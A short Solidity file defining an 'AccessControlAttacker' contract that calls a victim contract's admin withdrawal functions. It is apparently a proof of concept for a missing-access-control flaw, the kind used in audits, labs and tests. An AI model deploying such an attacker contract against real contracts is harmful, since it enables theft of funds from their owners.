// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IVictim {

    function withdrawContractFunds() external;
    function emergencyWithdraw() external;

}

contract AccessControlAttacker {

    IVictim public victim;

    constructor(address _victim){
        victim = IVictim(_victim);
    }

    function exploit() public {

        // Try to call admin functions
        victim.withdrawContractFunds();

        victim.emergencyWithdraw();

    }

}